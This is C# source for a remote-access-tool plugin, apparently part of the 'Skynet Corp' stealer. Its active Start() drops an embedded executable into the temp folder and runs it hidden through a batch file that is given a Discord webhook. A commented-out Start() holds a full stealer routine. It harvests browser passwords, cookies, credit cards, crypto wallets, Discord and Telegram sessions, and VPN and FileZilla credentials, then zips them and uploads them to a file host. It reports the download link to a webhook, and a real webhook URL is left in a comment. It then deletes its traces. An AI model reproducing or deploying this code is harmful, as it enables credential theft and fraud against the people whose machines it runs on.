using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using youknowcaliber;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "StSStart":
                        {
                            Start(unpack_msgpack.ForcePathObject("webhook").AsString);
                            break;
                        }
                    case "StSStop":
                        {
                            Stop();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        /*
        public static void Start(string webhook)
        {
            if (!File.Exists(Help.ExploitDir))
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // 
                {
                    try
                    {
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();

                        Threads.Add(new Thread(() => Browsers.Start())); // 

                        Threads.Add(new Thread(() => Files.GetFiles())); //

                        Threads.Add(new Thread(() => StartWallets.Start())); // 

                        Threads.Add(new Thread(() =>
                        {
                            Help.Ethernet(); // 
                            Screen.GetScreen(); // 
                            ProcessList.WriteProcesses(); //
                            SystemInfo.GetSystem(); //
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            ProtonVPN.Save();
                            OpenVPN.Save();
                            //NordVPN.Save();
                            //Steam.SteamGet();
                        }));

                        Threads.Add(new Thread(() =>
                        {
                            Discord.WriteDiscord();
                            FileZilla.GetFileZilla();
                            Telegram.GetTelegramSessions();
                            Vime.Get();
                        }));

                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();


                        string temp = Path.GetTempPath();
                        string zipArchive = Path.Combine(temp, "SKYNET.zip");
                        using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile(Encoding.GetEncoding("cp866"))) // 
                        {
                            zip.ParallelDeflateThreshold = -1;
                            zip.UseZip64WhenSaving = Ionic.Zip.Zip64Option.Always;
                            zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default; // 
                            zip.Comment =
                            "\n ================================================" +
                            "\n ===============SKYNET CORP STEALER===============" +
                            "\n ================================================" +
                            "\n ☠ Maded by SKYNET | T-800 ☠" +
                            "\n             💬 discord SkynetCorporation#5560          " +
                            "\n Written exclusively for Pegasus! Skynet Corporation is not responsible for the use of this project and any of its parts code.";
                            zip.Password = Config.zipPass;
                            zip.AddDirectory(Help.ExploitDir); // 
                            zip.Save(zipArchive); //  
                        }

                        string mssgBody =
                           "⚡️ Logs from 💀Skynet💀:" + Environment.NewLine +
                           "👨 User:" + Environment.MachineName + " " + Environment.UserName + Environment.NewLine +
                           "⚠️ Persononal Info ✔:" + Environment.NewLine +
                           "📡 IP ✔: " + SystemInfo.IP() + " " + SystemInfo.Country() + Environment.NewLine +
                           "💻 Desktop ✔: " + SystemInfo.GetSystemVersion() + Environment.NewLine +
                           " ================================" + Environment.NewLine +
                           "🔑 Passwords ✔:  Passwords - " + Counting.Passwords + Environment.NewLine +
                           "🍪 Cookie ✔: Cookies - " + Counting.Cookies + Environment.NewLine +
                           "⏳ History ✔: History - " + Counting.History + Environment.NewLine +
                           "📦 AutoFills ✔: AutoFills - " + Counting.AutoFill + Environment.NewLine +
                           "💳 Credit_Card ✔: CC - " + Counting.CreditCards + Environment.NewLine +
                           "📄 Files ✔:Grabbed Files - " + Counting.FileGrabber + Environment.NewLine +
                           "================================" + Environment.NewLine +
                           "🗃 SOFTWARE ✔:" + Environment.NewLine +
                           (Counting.Discord > 0 ? "💬   Discord" : "") +
                           (Counting.Wallets > 0 ? "💰   Wallets" : "") + Environment.NewLine +
                           (Counting.Telegram > 0 ? "✈️   Telegram" : "") + Environment.NewLine +
                           (Counting.FileZilla > 0 ? "📡   FileZilla" + " (" + Counting.FileZilla + ")" : "") + Environment.NewLine +
                           (Counting.Steam > 0 ? "🎮  Steam" : "") + Environment.NewLine +
                           (Counting.NordVPN > 0 ? "🔌   NordVPN" : "") + Environment.NewLine +
                           (Counting.OpenVPN > 0 ? "🔌   OpenVPN" : "") + Environment.NewLine +
                           (Counting.ProtonVPN > 0 ? "🔌   ProtonVPN" : "") + Environment.NewLine +
                           (Counting.VimeWorld > 0 ? "   VimeWorld" + (Config.VimeWorld == true ?
                           $":\n     NickName - {Vime.NickName()} " + Environment.NewLine +
                           $":\n     Donate - {Vime.Donate()} " + Environment.NewLine +
                           $":\n     Level - {Vime.Level()}" : "") : "") + Environment.NewLine +
                           "\n ================================" + Environment.NewLine +
                           "\n🌐 DOMAINS DETECTED ✔:" + Environment.NewLine +
                           "\n - " + URLSearcher.GetDomainDetect(Help.ExploitDir + "\\Browsers\\");


                        string filename = Environment.MachineName + "." + Environment.UserName + ".zip";
                        string fileformat = "zip";
                        string filepath = zipArchive;
                        string application = "";

                        try
                        {


                            using (defender defcon = new defender())
                            {
                                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                                foreach (ManagementObject managementObject in mos.Get())
                                {

                                    String OSName = managementObject["Caption"].ToString();
                                    defcon.ProfilePicture = "https://i.imgur.com/R2MxTYk.png";
                                    defcon.UserName = "SkynetCorp";
                                    defcon.WebHook = webhook;//"https://discord.com/api/webhooks/897769154508107787/MosDJqLW9RvZbvZJo5eQwx8b7zAAtZtz8e6Fgf8QNdLx-CPMM3OLTfxDuV6UWn0S5F8e"
                                    using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                                    {


                                        if (File.Exists(zipArchive))
                                        {

                                            AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                            string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                            while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                            defcon.SendMessage("```" + mssgBody + Environment.NewLine + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine + "🔐ZIP PASS:" + Config.zipPass + "" + Environment.NewLine + "```");


                                        }
                                        else
                                        {
                                            //System.IO.ZipFile.CreateFromDirectory(Help.ExploitDir, zipArchive);
                                            AnonFile cpanonFile = anonFileWrapper.UploadFile(zipArchive);
                                            string cp = anonFileWrapper.GetDirectDownloadLinkFromLink(cpanonFile.FullUrl);
                                            while (string.IsNullOrWhiteSpace(cp)) Thread.Sleep(5000);
                                            defcon.SendMessage("```" + mssgBody + Environment.NewLine + Environment.NewLine + "DOWNLOAD:🔗 " + cp + Environment.NewLine + "🔐ZIP PASS:" + Config.zipPass + "" + Environment.NewLine + "```");
                                        }

                                    }

                                }
                            }
                        }
                        catch
                        {


                        }

                        Finish(); // 

                    }

                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }
        */
        public static string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }
        public static void Start(string webhook)
        {
            string exe = Path.Combine(Path.GetTempPath(), "svgost.exe");
            string exbat = Path.Combine(Path.GetTempPath(), "exec.bat");
            string exlog = Path.Combine(Path.GetTempPath(), "log.txt");
            File.WriteAllBytes(exe, Properties.Resources.t800);
            System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "exec.bat"));
            file.WriteLine("set exeFile=" + exe);
            file.WriteLine("set logFile=" + exlog);
            file.WriteLine("%exeFile%  " + CreatePassword(10) + " " + webhook + " > %logFile%");
            file.Close();
            string chv = Path.Combine(Path.Combine(Path.GetTempPath(), "exec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();


        }
        public static void Stop()
        {
            Finish();
        }
        static void Finish()
        {
            string temp = Path.GetTempPath();
            string zipArchive = Path.Combine(temp, "SKYNET.zip");
            Thread.Sleep(15000);
            Directory.Delete(Help.ExploitDir + "\\", true);
            File.Delete(zipArchive);
            Environment.Exit(0);
        }
    }

}